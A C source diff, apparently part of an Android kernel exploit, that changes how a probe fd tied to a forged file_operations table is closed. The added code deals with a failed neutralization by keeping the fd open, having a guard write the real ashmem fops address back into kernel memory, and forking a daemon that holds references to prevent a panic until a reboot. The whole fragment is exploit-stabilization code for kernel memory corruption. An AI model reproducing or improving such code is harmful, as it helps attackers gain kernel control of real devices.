@@ -495,15 +495,35 @@ static int env_truthy(const char *name) {
  * the same +1 anchor, after which close is safe from any context.  Disarm
  * the guard first so it stops using the fd (a racing guard read fails
  * benignly with EBADF: read failures only count, never write).
+ *
+ * fix62 (2026-10-24): neutralize now retries (the single-shot write dying
+ * in the transient cfgfs ENOTTY window is what killed rounds 4/6/7 -- this
+ * very close(fd) then walked the dead table -> module_put panic).  If all
+ * retries fail the table stays armed, so instead of closing: keep the fd,
+ * flip the guard into real-table recovery mode (it blind-writes the
+ * canonical ashmem fops address into misc.fops, defusing the third-party
+ * open landmine whenever a write window reopens), and fork the fd-hold
+ * daemon whose inherited refcounts keep __fput from ever running on the
+ * chain's files until the fail-amplifier reboot reclaims everything.
  */
 static void close_fake_fops_probe_fd(const char *why) {
   if (g_fops_probe_fd < 0) {
     return;
   }
   int fd = g_fops_probe_fd;
+  if (ks_neutralize_fake_fops_close(fd) != 0) {
+    /* Table still armed: guard must keep working through this fd (do NOT
+     * disarm, do NOT close) and shift to restoring the REAL table. */
+    uintptr_t real_tbl = canon_addr(ASHMEM_FOPS);
+    pr_warning("exit tail: neutralize FAILED (%s); fd-hold containment, "
+               "guard -> real-table recovery %016zx\n",
+               why, real_tbl);
+    fops_guard_set_expect(real_tbl);
+    ks_fd_hold_daemon(why);
+    return;
+  }
   g_fops_probe_fd = -1;
   fops_guard_set_expect(0);
-  ks_neutralize_fake_fops_close(fd);
   close(fd);
   pr_info("exit tail: closed fake-fops probe fd=%d (%s)\n", fd, why);
 }
